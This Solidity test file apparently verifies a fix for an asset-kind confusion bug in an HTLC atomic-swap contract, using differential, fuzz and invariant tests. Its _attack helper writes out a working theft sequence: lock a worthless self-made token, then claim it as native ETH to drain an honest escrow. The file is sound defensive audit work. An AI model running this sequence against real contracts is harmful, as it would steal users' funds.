// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

// F-1 independent re-review (2026-10-30): differential tests original vs patched AtomicSwapHTLCv2.
//  - the original code (test/legacy copy, identical logic to the pre-fix src) loses honest native escrow
//    to the claimer of a self-made ERC-20 swap; the patched code never does;
//  - full asset-kind matrix: every claim/refund path accepts only the matching kind, before and after expiry;
//  - stateful invariant with an unrestricted attacker actor: honest native escrow is never reduced by the
//    attacker and the contract stays solvent for every asset.
// Local EVM only. Nothing here is deployable.

import "forge-std/Test.sol";
import "../src/AtomicSwapHTLCv2.sol";
import "./legacy/AtomicSwapHTLCv2Vulnerable.sol";

contract F1Junk {
    mapping(address => uint256) public balanceOf;
    function mint(address to, uint256 v) external { balanceOf[to] += v; }
    function approve(address, uint256) external pure returns (bool) { return true; }
    function transferFrom(address f, address t, uint256 v) external returns (bool) {
        require(balanceOf[f] >= v, "BAL"); balanceOf[f] -= v; balanceOf[t] += v; return true;
    }
    function transfer(address t, uint256 v) external returns (bool) {
        require(balanceOf[msg.sender] >= v, "BAL"); balanceOf[msg.sender] -= v; balanceOf[t] += v; return true;
    }
}

contract AtomicSwapHTLCv2F1DifferentialTest is Test {
    address constant LOCKER = address(0x1111);
    address constant CLAIMER = address(0x2222);
    address constant ATTACKER = address(0x3333);
    bytes32 constant VPRE = bytes32(uint256(0xA1));
    bytes32 constant APRE = bytes32(uint256(0xB2));
    bytes32 vhl; bytes32 ahl;

    function setUp() public {
        vhl = sha256(abi.encodePacked(VPRE)); ahl = sha256(abi.encodePacked(APRE));
        vm.deal(LOCKER, type(uint128).max);
    }

    // Runs the exploit sequence on `target`; returns the wei the attacker gained (0 when blocked).
    function _attack(address target, uint256 victimWei, uint256 stealWei) internal returns (uint256 gained) {
        bytes32 vid = keccak256(abi.encode("v", target)); bytes32 aid = keccak256(abi.encode("a", target));
        vm.prank(LOCKER);
        AtomicSwapHTLCv2(payable(target)).lockNative{value: victimWei}(vid, vhl, block.number + 100, CLAIMER, LOCKER);
        F1Junk junk = new F1Junk(); junk.mint(ATTACKER, stealWei);
        vm.prank(ATTACKER);
        AtomicSwapHTLCv2(payable(target)).lockERC20(aid, address(junk), stealWei, ahl, block.number + 100, ATTACKER, ATTACKER);
        uint256 before = ATTACKER.balance;
        vm.prank(ATTACKER);
        (bool ok, ) = target.call(abi.encodeWithSelector(AtomicSwapHTLCv2.claimNative.selector, aid, APRE));
        if (ok) gained = ATTACKER.balance - before;
    }

    function test_original_attacker_steals_entire_native_escrow() public {
        AtomicSwapHTLCv2Vulnerable old = new AtomicSwapHTLCv2Vulnerable();
        uint256 gained = _attack(address(old), 7 ether, 7 ether);
        assertEq(gained, 7 ether, "original: attacker drained the honest native swap");
        assertEq(address(old).balance, 0);
        bytes32 vid = keccak256(abi.encode("v", address(old)));
        vm.prank(CLAIMER); vm.expectRevert(bytes("SEND_FAILED")); old.claimNative(vid, VPRE);
    }

    function test_patched_same_attack_reverts_and_victim_is_paid() public {
        AtomicSwapHTLCv2 h = new AtomicSwapHTLCv2();
        uint256 gained = _attack(address(h), 7 ether, 7 ether);
        assertEq(gained, 0, "patched: attack blocked");
        assertEq(address(h).balance, 7 ether);
        bytes32 vid = keccak256(abi.encode("v", address(h)));
        vm.prank(CLAIMER); h.claimNative(vid, VPRE);
        assertEq(CLAIMER.balance, 7 ether);
    }

    function testFuzz_differential(uint96 victimWei, uint96 stealWei) public {
        victimWei = uint96(bound(victimWei, 1, 1e27));
        stealWei = uint96(bound(stealWei, 1, victimWei));
        AtomicSwapHTLCv2Vulnerable old = new AtomicSwapHTLCv2Vulnerable();
        AtomicSwapHTLCv2 h = new AtomicSwapHTLCv2();
        assertEq(_attack(address(old), victimWei, stealWei), stealWei, "original always loses stealWei");
        assertEq(_attack(address(h), victimWei, stealWei), 0, "patched never loses");
        assertEq(address(h).balance, victimWei);
    }

    // ---- asset-kind matrix on the patched contract ----
    function _call(AtomicSwapHTLCv2 h, uint8 fn, bytes32 id, bytes32 pre, address who) internal returns (bool ok, bytes memory ret) {
        bytes memory data;
        if (fn == 0) data = abi.encodeWithSelector(h.claimNative.selector, id, pre);
        else if (fn == 1) data = abi.encodeWithSelector(h.claimERC20.selector, id, pre, uint256(0));
        else if (fn == 2) data = abi.encodeWithSelector(h.refundNative.selector, id);
        else data = abi.encodeWithSelector(h.refundERC20.selector, id);
        vm.prank(who);
        (ok, ret) = address(h).call(data);
    }

    function test_kind_matrix_every_path_rejects_wrong_kind() public {
        for (uint8 fn = 0; fn < 4; fn++) {
            for (uint8 late = 0; late < 2; late++) {
                AtomicSwapHTLCv2 h = new AtomicSwapHTLCv2();
                uint256 rt = block.number + 10;
                vm.prank(LOCKER); h.lockNative{value: 1 ether}(keccak256("n"), vhl, rt, CLAIMER, LOCKER);
                F1Junk t = new F1Junk(); t.mint(LOCKER, 1 ether);
                vm.prank(LOCKER); h.lockERC20(keccak256("t"), address(t), 1 ether, vhl, rt, CLAIMER, LOCKER);
                if (late == 1) vm.roll(rt);
                bool claimFn = fn < 2; bool nativeFn = (fn == 0 || fn == 2);
                address who = claimFn ? CLAIMER : LOCKER;
                // wrong kind must always fail
                (bool okWrong, ) = _call(h, fn, nativeFn ? keccak256("t") : keccak256("n"), VPRE, who);
                assertFalse(okWrong, "wrong kind accepted");
                // right kind succeeds exactly when the time window allows it
                (bool okRight, ) = _call(h, fn, nativeFn ? keccak256("n") : keccak256("t"), VPRE, who);
                assertEq(okRight, claimFn ? late == 0 : late == 1, "right kind window");
                vm.roll(1);
            }
        }
    }
}

// ---- stateful: unrestricted attacker against honest native + token escrow ----
contract F1AttackHandler is Test {
    AtomicSwapHTLCv2 public h;
    F1Junk public junk;
    F1Junk public honestTok;
    address constant ATK = address(0xBAD0);
    address constant HONEST = address(0x600D);
    bytes32 constant PRE = bytes32(uint256(0xC0FFEE));
    bytes32 public hl;
    bytes32[] public ids;
    uint256 public honestNativeOpen;   // native escrow owned by honest parties (claimer = refunder = HONEST)
    uint256 public honestTokOpen;
    uint256 public n;

    constructor(AtomicSwapHTLCv2 _h) {
        h = _h; junk = new F1Junk(); honestTok = new F1Junk(); hl = sha256(abi.encodePacked(PRE));
        vm.deal(HONEST, 1e30); vm.deal(ATK, 1e30);
    }
    function honestLockNative(uint96 a) external {
        a = uint96(bound(a, 1, 1e24));
        vm.prank(HONEST); h.lockNative{value: a}(keccak256(abi.encode("hn", n++)), keccak256("unknown"), block.number + 1e6, HONEST, HONEST);
        honestNativeOpen += a;
    }
    function honestLockToken(uint96 a) external {
        a = uint96(bound(a, 1, 1e24)); honestTok.mint(HONEST, a);
        vm.prank(HONEST); h.lockERC20(keccak256(abi.encode("ht", n++)), address(honestTok), a, keccak256("unknown"), block.number + 1e6, HONEST, HONEST);
        honestTokOpen += a;
    }
    // attacker locks native or junk with himself as both parties and a preimage he knows
    function atkLock(uint96 a, bool native, uint8 ttl) external {
        a = uint96(bound(a, 1, 1e24)); bytes32 id = keccak256(abi.encode("atk", n++)); ids.push(id);
        uint256 rt = block.number + 1 + (ttl % 5);
        if (native) { vm.prank(ATK); h.lockNative{value: a}(id, hl, rt, ATK, ATK); }
        else { junk.mint(ATK, a); vm.prank(ATK); h.lockERC20(id, address(junk), a, hl, rt, ATK, ATK); }
    }
    // attacker tries any path on any of his swaps (and on arbitrary ids)
    function atkSettle(uint256 i, uint8 fn) external {
        bytes32 id = ids.length == 0 ? keccak256(abi.encode(i)) : ids[i % ids.length];
        bytes memory data;
        fn %= 4;
        if (fn == 0) data = abi.encodeWithSelector(h.claimNative.selector, id, PRE);
        else if (fn == 1) data = abi.encodeWithSelector(h.claimERC20.selector, id, PRE, uint256(0));
        else if (fn == 2) data = abi.encodeWithSelector(h.refundNative.selector, id);
        else data = abi.encodeWithSelector(h.refundERC20.selector, id);
        vm.prank(ATK); (bool ok, ) = address(h).call(data); ok;
    }
    function roll(uint8 k) external { vm.roll(block.number + 1 + (k % 6)); }
    function atkNativeOpen() public view returns (uint256 s) {
        for (uint256 i; i < ids.length; i++) {
            AtomicSwapHTLCv2.Swap memory w = h.getSwap(ids[i]);
            if (w.state == AtomicSwapHTLCv2.State.LOCKED && w.token == address(0)) s += w.lockedAmount;
        }
    }
    function atkJunkOpen() public view returns (uint256 s) {
        for (uint256 i; i < ids.length; i++) {
            AtomicSwapHTLCv2.Swap memory w = h.getSwap(ids[i]);
            if (w.state == AtomicSwapHTLCv2.State.LOCKED && w.token == address(junk)) s += w.lockedAmount;
        }
    }
}

contract AtomicSwapHTLCv2F1AttackInvariantTest is Test {
    AtomicSwapHTLCv2 h; F1AttackHandler handler;
    function setUp() public {
        h = new AtomicSwapHTLCv2(); handler = new F1AttackHandler(h); targetContract(address(handler));
    }
    /// honest native escrow is never touched by the attacker; ETH balance == exact open native obligations
    function invariant_nativeSolvencyExact() public view {
        assertEq(address(h).balance, handler.honestNativeOpen() + handler.atkNativeOpen());
    }
    function invariant_tokenSolvencyExact() public view {
        assertEq(handler.honestTok().balanceOf(address(h)), handler.honestTokOpen());
        assertEq(handler.junk().balanceOf(address(h)), handler.atkJunkOpen());
    }
}
